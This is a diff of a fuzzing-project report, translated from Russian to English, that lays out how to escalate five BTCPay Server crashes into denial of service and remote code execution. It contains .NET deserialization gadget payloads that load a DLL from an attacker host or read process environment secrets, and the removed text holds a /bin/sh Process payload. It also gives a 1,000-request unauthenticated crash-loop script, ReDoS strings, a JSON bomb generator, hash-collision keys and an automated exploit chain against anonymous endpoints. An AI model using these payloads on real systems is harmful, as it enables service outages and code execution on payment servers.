@@ -1,75 +1,97 @@
-# Анализ багов BTCPay Server — пути эскалации до DDoS / RCE
+# BTCPay Server — Crash Escalation Analysis
+
+> Research analysis of 5 crashes found during automated fuzzing. Covers realistic escalation paths to DDoS and potential RCE.
+
+**→ [Back to README](README.md) · [BTCPay Report](BTCPAYSERVER_REPORT.md) · [BTCPay Quickstart](QUICKSTART_BTCPAYSERVER.md)**
+
+---
+
+## Table of Contents
+
+1. [TL;DR](#tldr)
+2. [Critical Code Findings](#critical-code-findings)
+3. [Path 1: DDoS via Deep Nesting and Memory Exhaustion](#path-1-ddos-via-deep-nesting-and-memory-exhaustion)
+4. [Path 2: RCE via Newtonsoft.Json `$type` Deserialization](#path-2-rce-via-newtonsoftjson-type-deserialization)
+5. [Path 3: DDoS via ReDoS (Regex Injection)](#path-3-ddos-via-redos-regex-injection)
+6. [Path 4: Application-Level DDoS via Crash Loop](#path-4-application-level-ddos-via-crash-loop)
+7. [Fuzzer Improvement Recommendations](#fuzzer-improvement-recommendations)
+8. [Overall Assessment](#overall-assessment)
+
+---
 
 ## TL;DR
 
-Фаззер нашёл **5 крашей** (500 Internal Server Error), все связаны с `Newtonsoft.Json` десериализацией. Из них:
+The fuzzer found **5 crashes** (500 Internal Server Error), all related to `Newtonsoft.Json` deserialization. Escalation potential:
 
-| # | Баг | DDoS потенциал | RCE потенциал | Реалистичность |
-|---|-----|:-:|:-:|:-:|
-| 1 | `$type` confusion в Pull Payments | ⚠️ Средний | 🔴 **Высокий** | Нужна проверка `TypeNameHandling` |
-| 2 | Deep Nesting + AssemblyInstaller | 🔴 **Высокий** | 🔴 **Высокий** | Gadget chain уже готов |
-| 3 | Regex Injection в multipart | 🔴 **Высокий** | ⚪ Низкий | ReDoS — классический вектор |
-| 4 | NullRef в Payouts (`Infinity`) | ⚠️ Средний | ⚪ Низкий | Crash-loop DoS |
-| 5 | Array overflow в subscriber-portal | 🔴 **Высокий** | ⚪ Низкий | Memory exhaustion |
+| # | Bug | DDoS Potential | RCE Potential | Notes |
+|---|-----|:-:|:-:|---|
+| 1 | `$type` confusion in Pull Payments | Medium | **High** | Requires `TypeNameHandling` verification |
+| 2 | Deep nesting + AssemblyInstaller | **High** | **High** | Gadget chain already formed |
+| 3 | Regex injection in multipart | **High** | Low | Classic ReDoS vector |
+| 4 | NullRef in Payouts (`Infinity`) | Medium | Low | Crash-loop DoS |
+| 5 | Array overflow in subscriber-portal | **High** | Low | Memory exhaustion |
 
 ---
 
-## 🔑 Ключевой факт из исходного кода
+## Critical Code Findings
 
-Анализ исходников BTCPay Server выявил **критические архитектурные слабости**, которые делают эскалацию реалистичной:
+Static analysis of the BTCPay Server source code (instrumented copy in `btcpayserver_prep/`) revealed three architectural weaknesses that make escalation realistic.
 
-### 1. `TypeNameHandling` наследуется, а не хардкодится в `None`
+### 1. `TypeNameHandling` is inherited, not hardcoded to `None`
 
-В [Extensions.cs:134](file:///Users/sergeiovchinnikov/PycharmProjects/upside-fuzzer/btcpayserver_prep/BTCPayServer/Extensions.cs#L134):
+In `BTCPayServer/Extensions.cs`:
 ```csharp
-TypeNameHandling = settings.TypeNameHandling,  // просто копирует из parent settings!
+TypeNameHandling = settings.TypeNameHandling,  // copies from parent settings!
 ```
 
-В [BlobSerializer.cs:31-41](file:///Users/sergeiovchinnikov/PycharmProjects/upside-fuzzer/btcpayserver_prep/BTCPayServer/Data/BlobSerializer.cs#L31-L41) — `CreateSettings()` **НЕ устанавливает** `TypeNameHandling = None` явно, полагаясь на дефолт `Newtonsoft.Json`. Дефолт — `TypeNameHandling.None`, **но** если любой плагин или `NBXplorer.Serializer.ConfigureSerializer()` поменяет его — вся цепочка наследует.
+In `BTCPayServer/Data/BlobSerializer.cs`, `CreateSettings()` does **not** explicitly set `TypeNameHandling = None`, relying on the Newtonsoft.Json default. The default is `TypeNameHandling.None`, **however** if any plugin or `NBXplorer.Serializer.ConfigureSerializer()` changes it, the entire inheritance chain inherits the new value.
 
-### 2. `MaxRequestBodySize = int.MaxValue` в PluginManager
+### 2. `MaxRequestBodySize = int.MaxValue` in PluginManager
 
-[PluginManager.cs:178](file:///Users/sergeiovchinnikov/PycharmProjects/upside-fuzzer/btcpayserver_prep/BTCPayServer/Plugins/PluginManager.cs#L178):
+In `BTCPayServer/Plugins/PluginManager.cs`:
 ```csharp
-options.Limits.MaxRequestBodySize = int.MaxValue; // ~2GB!
+options.Limits.MaxRequestBodySize = int.MaxValue; // ~2 GB!
 ```
 
 > [!CAUTION]
-> Это убивает защиту от memory exhaustion. Атакующий может слать тела запросов до 2GB на **любой** endpoint.
+> This effectively disables memory-exhaustion protection. An attacker can send request bodies up to 2 GB to **any** endpoint and Kestrel will accept them.
 
-### 3. `[AllowAnonymous]` на PullPayment endpoints
+### 3. `[AllowAnonymous]` on PullPayment endpoints
 
-[GreenfieldPullPaymentController.cs](file:///Users/sergeiovchinnikov/PycharmProjects/upside-fuzzer/btcpayserver_prep/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs) — 6 эндпоинтов с `[AllowAnonymous]`:
-- `POST /api/v1/pull-payments/{id}/boltcards` (строка 180)
-- `GET /api/v1/pull-payments/{id}` (строка 315)
-- `GET /api/v1/pull-payments/{id}/payouts` (строка 336)
-- `GET /api/v1/pull-payments/{id}/payouts/{payoutId}` (строка 355)
-- `GET /api/v1/pull-payments/{id}/lnurl` (строка 375)
-- `POST /api/v1/pull-payments/{id}/payouts` (строка 423)
+`GreenfieldPullPaymentController.cs` exposes 6 endpoints with `[AllowAnonymous]`:
+
+| Endpoint | Line |
+|----------|------|
+| `POST /api/v1/pull-payments/{id}/boltcards` | 180 |
+| `GET /api/v1/pull-payments/{id}` | 315 |
+| `GET /api/v1/pull-payments/{id}/payouts` | 336 |
+| `GET /api/v1/pull-payments/{id}/payouts/{payoutId}` | 355 |
+| `GET /api/v1/pull-payments/{id}/lnurl` | 375 |
+| `POST /api/v1/pull-payments/{id}/payouts` | 423 |
 
 > [!WARNING]
-> Для DDoS и RCE на этих эндпоинтах **не нужна аутентификация**. Rate limiting на эти маршруты **не применяется** (он есть только на Login, Register, PublicInvoices, PayJoin).
+> DDoS and potential RCE attacks against these endpoints **require no authentication**. Rate limiting is not applied to these routes (it is only applied to Login, Register, PublicInvoices, and PayJoin).
 
 ---
 
-## 📌 Путь 1: DDoS через Deep Nesting + Memory Exhaustion
+## Path 1: DDoS via Deep Nesting and Memory Exhaustion
 
-### Что уже есть
-Crash 5 (subscriber-portal) и Crash 2 (deep nesting) показали, что сервер крашится при:
-- Массивах из 100+ элементов
-- Глубоком JSON-вложении (100 уровней `{"a": {"a": ...}}`)
+The fuzzer confirmed that the server crashes when receiving:
+- Arrays of 100+ elements
+- Deep JSON nesting (100 levels of `{"a": {...}}`)
 
-### Как докрутить
+### A. JSON Bomb (Quadratic Memory Blowup)
 
-#### A. JSON Bomb (Quadratic Blowup)
 ```json
-{"a": "AAAA...x100KB", "b": "AAAA...x100KB", ... (x1000 полей)}
+{"a": "AAAA...x100KB", "b": "AAAA...x100KB", ... (x1000 fields)}
 ```
-Суммарный payload ~100MB. Благодаря `MaxRequestBodySize = int.MaxValue`, Kestrel пропустит.
 
-**Вектор для фаззера**: Добавить в [mutation_engine.go](file:///Users/sergeiovchinnikov/PycharmProjects/upside-fuzzer/void/go/mutation_engine.go) мутатор `json_bomb`:
+Total payload ~100 MB. With `MaxRequestBodySize = int.MaxValue`, Kestrel passes it without restriction.
+
+**Fuzzer vector:** Add a `json_bomb` mutator to `void/go/mutation_engine.go`:
+
 ```go
-// Генерирует JSON с N повторяющимися большими полями
+// Generates JSON with N repeating large fields
 func mutateJsonBomb(body string) string {
     field := strings.Repeat("A", 100_000)
     var sb strings.Builder
@@ -83,54 +105,52 @@ func mutateJsonBomb(body string) string {
 }
 ```
 
-#### B. Hash Collision DoS (HashDoS)
-Newtonsoft.Json использует `Dictionary<string, JToken>` внутри `JObject`. Если отправить JSON с ключами, которые дают коллизии в .NET `string.GetHashCode()`:
+### B. Hash Collision DoS (HashDoS)
+
+Newtonsoft.Json uses `Dictionary<string, JToken>` inside `JObject`. Sending JSON with keys that collide in .NET's `string.GetHashCode()` degrades O(1) lookups to O(n²):
+
 ```json
-{"AaAaAa": 1, "AaAaBB": 2, "AaBBAa": 3, ...}  // классический .NET HashDoS
+{"AaAaAa": 1, "AaAaBB": 2, "AaBBAa": 3, ...}
 ```
-Это превращает O(1) lookup в O(n²), делая парсинг одного запроса экспоненциально дорогим.
 
-**Целевой endpoint**: `POST /api/v1/pull-payments/{id}/boltcards` — анонимный, принимает JSON body.
+**Target endpoint:** `POST /api/v1/pull-payments/{id}/boltcards` — anonymous, accepts a JSON body.
 
-#### C. Recursive Nesting Stack Overflow
-Фаззер уже нашёл crash с 100 уровнями. Нужно проверить, отключён ли `MaxDepth` в `JsonSerializerSettings`:
+### C. Recursive Nesting Stack Overflow
 
-По исходникам — `MaxDepth` **нигде не устанавливается явно** (кроме клонирования в Extensions.cs). Дефолт Newtonsoft.Json = 64. Но:
-- Мы можем слать 64 уровня * множество запросов параллельно
-- Каждый уровень вложенности аллоцирует стек-фрейм ~1KB → 64KB stack per request → при 1000 параллельных запросах = 64MB стека
+The fuzzer already found a crash at 100 nesting levels. `MaxDepth` is not set explicitly anywhere in the codebase (Newtonsoft.Json default is 64). At 1,000 parallel requests, each needing ~1 KB stack frame per nesting level, this can exhaust thread-pool memory.
 
-**Рекомендация для фаззера**: Добавить параметр `-deep-nest-levels` и генерировать вложение ровно на границе MaxDepth (63-65 уровней).
+**Recommendation:** Add a `-deep-nest-levels` parameter and generate nesting at exactly the `MaxDepth` boundary (63–65 levels).
 
 ---
 
-## 📌 Путь 2: RCE через Newtonsoft.Json `$type` Deserialization
+## Path 2: RCE via Newtonsoft.Json `$type` Deserialization
 
-### Что уже есть
-Crash 1 и Exploit 1-2 показали, что:
-- `{"$type": "System.Configuration.Install.AssemblyInstaller, ..."}` **достигает десериализатора**
-- Сервер крашится с `NullReferenceException` в `JsonSerializerInternalReader.CreateObject` — это значит, что Newtonsoft **пытается** резолвить тип, но не может
+Crashes 1 and 2 confirmed that:
+- `{"$type": "System.Configuration.Install.AssemblyInstaller, ..."}` **reaches the deserializer**
+- The server crashes with `NullReferenceException` in `JsonSerializerInternalReader.CreateObject`, meaning Newtonsoft.Json **attempts** to resolve the type but fails
 
-### Почему это ещё не RCE
+### Why This Is Not Yet RCE
 
-Текущее поведение (`NullReferenceException`) означает одно из:
-1. `TypeNameHandling = Auto` или `Objects` — тип резолвится, но class не найден (assembly not loaded)
-2. `TypeNameHandling = None` (дефолт) — `$type` игнорируется, но NullRef возникает по другой причине (null object в десериализации)
+The current behavior (`NullReferenceException`) indicates one of:
+1. `TypeNameHandling = Auto` or `Objects` — the type is resolved, but the class is not found (assembly not loaded)
+2. `TypeNameHandling = None` (default) — `$type` is ignored, but NullRef occurs from a different null value during deserialization
 
-### Как проверить и докрутить
+### Verification: Determine the Active `TypeNameHandling`
 
-#### A. Точное определение `TypeNameHandling`
+Send an **oracle payload** using a type that is definitely loaded in the process:
 
-Добавить в фаззер **oracle payload** — тип, который **точно** загружен в процесс:
 ```json
 {
     "$type": "Newtonsoft.Json.Linq.JObject, Newtonsoft.Json",
     "test": "value"
 }
 ```
-- Если ответ **200/400** (а не 500) → `TypeNameHandling != None`, тип резолвился успешно → **RCE возможен**
-- Если ответ **500 NullRef** → тип всё равно не резолвился → вероятно `TypeNameHandling.None`
 
-Ещё один oracle:
+- **200 or 400 response** → `TypeNameHandling != None`; the type resolved successfully → **RCE is possible**
+- **500 NullRef** → type was not resolved → likely `TypeNameHandling.None`
+
+Additional oracle:
+
 ```json
 {
     "$type": "System.String, mscorlib",
@@ -138,41 +158,9 @@ Crash 1 и Exploit 1-2 показали, что:
 }
 ```
 
-#### B. Gadget Chains для .NET
+### Gadget Chains for .NET on Linux
 
-Если `TypeNameHandling != None`, вот проверенные gadget chains:
-
-```mermaid
-graph TD
-    A["$type: ObjectDataProvider"] --> B["MethodName: Start"]
-    B --> C["ObjectInstance.$type: Process"]
-    C --> D["FileName: /bin/sh"]
-    D --> E["Arguments: -c 'id > /tmp/pwned'"]
-
-    F["$type: AssemblyInstaller"] --> G["Path: http://attacker/payload.dll"]
-    G --> H["Assembly загружается и выполняется"]
-
-    I["$type: XamlReader"] --> J["PropertyInspectorFontAndColorData: XAML payload"]
-    J --> K["Произвольное выполнение кода через XAML"]
-```
-
-Конкретные payloads для добавления в `dict.json`:
-```json
-{
-    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
-    "MethodName": "Start",
-    "MethodParameters": {
-        "$type": "System.Collections.ArrayList, mscorlib",
-        "$values": ["/bin/sh", "-c id"]
-    },
-    "ObjectInstance": {
-        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
-    }
-}
-```
-
-> [!IMPORTANT]
-> BTCPay Server работает в Docker на Linux. `PresentationFramework` недоступен! Нужны **Linux-специфичные gadget chains**. Самые перспективные:
+If `TypeNameHandling != None`, these are the most viable Linux-specific gadget chains for .NET running in Docker:
 
 ```json
 {"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker.com/evil.dll"}
@@ -182,36 +170,39 @@ graph TD
 {"$type":"System.IO.FileInfo, System.IO.FileSystem","FileName":"/proc/self/environ"}
 ```
 
-#### C. Через NBXplorer serializer
+> [!IMPORTANT]
+> BTCPay Server runs in Docker on Linux. Windows-specific gadget chains (e.g., `PresentationFramework`, `ObjectDataProvider`) are **not available**. Only Linux-compatible .NET assemblies loaded into the process are viable gadget candidates.
 
-В [BlobSerializer.cs:26](file:///Users/sergeiovchinnikov/PycharmProjects/upside-fuzzer/btcpayserver_prep/BTCPayServer/Data/BlobSerializer.cs#L26):
+### Through the NBXplorer Serializer
+
+In `BTCPayServer/Data/BlobSerializer.cs`:
 ```csharp
-network.Serializer.ConfigureSerializer(settings);  // NBXplorer может включить TypeNameHandling!
+network.Serializer.ConfigureSerializer(settings);  // NBXplorer may enable TypeNameHandling!
 ```
 
-Нужно проверить, что именно `NBXplorer.Serializer.ConfigureSerializer()` делает с `TypeNameHandling`. Это **чужой код** из dependency — и это слабое звено.
+`NBXplorer.Serializer.ConfigureSerializer()` is third-party code. Its behavior with `TypeNameHandling` is a critical unknown and should be audited directly.
 
 ---
 
-## 📌 Путь 3: DDoS через ReDoS (Regex Injection)
+## Path 3: DDoS via ReDoS (Regex Injection)
 
-### Что уже есть
-Crash 3 (Regex Injection): `filename="{\"$regex\":\".*\"}"` в multipart → crash.
+**Crash 3** confirmed that `filename="{\"$regex\":\".*\"}"` in a multipart boundary triggers a server crash.
 
-### Как докрутить
+### Classic ReDoS Payloads
 
-#### A. Классический ReDoS payload
 ```
 filename="(a+)+$aaaaaaaaaaaaaaaaaaaaaa!"
 ```
-Или:
 ```
 filename="(a|aa)+$" + "a" * 30
 ```
-Это вызывает экспоненциальное backtracking в regex engine. Один запрос может держать CPU thread 10+ секунд.
 
-#### B. Автоматизация через фаззер
-Добавить в `mutation_engine.go` мутатор для multipart boundaries и filename:
+These cause exponential backtracking in the regex engine. A single request can hold a CPU thread for 10+ seconds.
+
+### Fuzzer Automation
+
+Add a ReDoS mutator for multipart boundaries in `void/go/mutation_engine.go`:
+
 ```go
 var redosPayloads = []string{
     `(a+)+$` + strings.Repeat("a", 25) + "!",
@@ -223,73 +214,85 @@ var redosPayloads = []string{
 
 ---
 
-## 📌 Путь 4: Application-Level DDoS через crash-loop
+## Path 4: Application-Level DDoS via Crash Loop
 
-### Что уже есть
-Все 5 крашей дают 500. При наличии `[AllowAnonymous]` на 6 endpoints:
+All 5 crashes return 500. With `[AllowAnonymous]` on 6 endpoints and no rate limiting, an attacker can maintain a continuous crash loop.
 
-### Скрипт для проверки стабильности crash-loop
+### Stability Verification Script
+
 ```bash
-# 1000 параллельных crash-запросов
+# 1000 parallel crash requests (unauthenticated)
 for i in $(seq 1 1000); do
   curl -s -X POST "http://target/api/v1/pull-payments/\$\{\"\\$ne\":null\}/boltcards" \
     -H "Content-Type: application/json" \
-    -d '{"$type":null,"UID":"'$(python3 -c "print('A'*100000)")'"}'  &
+    -d '{"$type":null,"UID":"'"$(python3 -c "print('A'*100000)")"'"}' &
 done
 wait
 ```
 
-Если BTCPay Server не перехватывает `NullReferenceException` на уровне middleware (а по crash-данным он этого **не делает**) — каждый такой запрос может:
-1. Убить worker thread
-2. При достаточном параллелизме → исчерпать thread pool → **полный denial of service**
+If BTCPay Server does not catch `NullReferenceException` at the middleware level (the crash data confirms it does **not**), each such request can exhaust a worker thread. At sufficient parallelism, this depletes the thread pool and causes a complete denial of service.
 
 ---
 
-## 🛠 Рекомендации по улучшению фаззера
+## Fuzzer Improvement Recommendations
 
-### 1. Новые мутаторы для `mutation_engine.go`
+### New mutators for `void/go/mutation_engine.go`
 
-| Мутатор | Цель | Приоритет |
-|---------|------|-----------|
-| `json_bomb` | Memory exhaustion DDoS | 🔴 |
-| `json_hashdos` | CPU exhaustion через hash collisions | 🔴 |
-| `redos_filename` | ReDoS в multipart | 🔴 |
-| `type_oracle` | Определение `TypeNameHandling` | 🔴 |
-| `linux_gadget_chain` | Linux-specific .NET RCE gadgets | ⚠️ |
-| `deep_nest_boundary` | Stack overflow на границе MaxDepth | ⚠️ |
+| Mutator | Target | Priority |
+|---------|--------|----------|
+| `json_bomb` | Memory exhaustion DoS | High |
+| `json_hashdos` | CPU exhaustion via hash collisions | High |
+| `redos_filename` | ReDoS in multipart | High |
+| `type_oracle` | Determine `TypeNameHandling` | High |
+| `linux_gadget_chain` | Linux-specific .NET RCE gadgets | Medium |
+| `deep_nest_boundary` | Stack overflow at `MaxDepth` boundary | Medium |
 
-### 2. Новые записи для `dict.json`
+### New `dict.json` entries
 
 ```json
 {
     "restler_custom_payload": {
-        "__dollar_type_oracle__": ["Newtonsoft.Json.Linq.JObject, Newtonsoft.Json", "System.String, mscorlib"],
-        "__redos__": ["(a+)+$aaaaaaaaaaaaaaaaaaa!", "([a-z]+)*$zzzzzzzzzzzzzzzzz1"],
-        "__hashdos_key__": ["AaAaAa", "AaAaBB", "AaBBAa", "AaBBBB", "BBAaAa", "BBAaBB", "BBBBAa", "BBBBBB"]
+        "__dollar_type_oracle__": [
+            "Newtonsoft.Json.Linq.JObject, Newtonsoft.Json",
+            "System.String, mscorlib"
+        ],
+        "__redos__": [
+            "(a+)+$aaaaaaaaaaaaaaaaaaa!",
+            "([a-z]+)*$zzzzzzzzzzzzzzzzz1"
+        ],
+        "__hashdos_key__": [
+            "AaAaAa", "AaAaBB", "AaBBAa", "AaBBBB",
+            "BBAaAa", "BBAaBB", "BBBBAa", "BBBBBB"
+        ]
     }
 }
 ```
 
-### 3. Sequence Engine: crash amplification chain
+### Sequence Engine: Crash Amplification Chain
 
-Научить sequence engine строить **crash amplification** цепочки:
-1. `POST /api/v1/stores` → создать store (producer)
-2. `POST /api/v1/stores/{storeId}/pull-payments` → создать pull payment (consumer → producer)
+Train the sequence engine to build end-to-end exploit chains for the pull payment vulnerability:
+
+1. `POST /api/v1/stores` → create a store (producer)
+2. `POST /api/v1/stores/{storeId}/pull-payments` → create a pull payment (consumer → producer)
 3. `POST /api/v1/pull-payments/{ppId}/boltcards` → **crash payload** (consumer, `[AllowAnonymous]`)
 
-Это позволит фаззеру **автоматически** строить end-to-end эксплойт: создать легитимный pull payment, а потом атаковать его анонимный endpoint.
+This enables the fuzzer to automatically build a complete exploit: create a legitimate pull payment, then attack its anonymous endpoint.
 
 ---
 
-## ⚖️ Итоговая оценка
+## Overall Assessment
 
 > [!IMPORTANT]
-> **DDoS** — реалистичен прямо сейчас. Комбинация `MaxRequestBodySize = int.MaxValue` + `[AllowAnonymous]` + отсутствие rate limiting на PullPayment endpoints = гарантированный Application-Level DoS.
+> **DDoS** is realistic right now. The combination of `MaxRequestBodySize = int.MaxValue` + `[AllowAnonymous]` + no rate limiting on PullPayment endpoints creates a guaranteed application-level denial of service vector.
 
 > [!WARNING]
-> **RCE** — требует одного из:
-> 1. Подтверждения, что `TypeNameHandling != None` (oracle payload)
-> 2. Нахождения пути через NBXplorer serializer, который включает `TypeNameHandling`
-> 3. Нахождения другого десериализатора (BinaryFormatter, DataContractSerializer) в codebase
+> **RCE** requires one of:
+> 1. Confirming `TypeNameHandling != None` (via oracle payload)
+> 2. Finding a path through the NBXplorer serializer that enables `TypeNameHandling`
+> 3. Locating another deserializer (`BinaryFormatter`, `DataContractSerializer`) in the codebase
 >
-> Текущие `NullReferenceException` — **пограничный сигнал**. Они показывают, что десериализатор *обрабатывает* `$type`, но не может resolve type. Это может быть как `TypeNameHandling.None` с побочным эффектом, так и `TypeNameHandling.Auto` с недоступной assembly.
+> The current `NullReferenceException` crashes are a **borderline signal**: they show the deserializer *processes* `$type`, but cannot resolve the type. This can indicate either `TypeNameHandling.None` with a side-effect null, or `TypeNameHandling.Auto` with an unavailable assembly.
+
+---
+
+**→ [Back to README](README.md) · [BTCPay Report](BTCPAYSERVER_REPORT.md) · [BTCPay Quickstart](QUICKSTART_BTCPAYSERVER.md)**
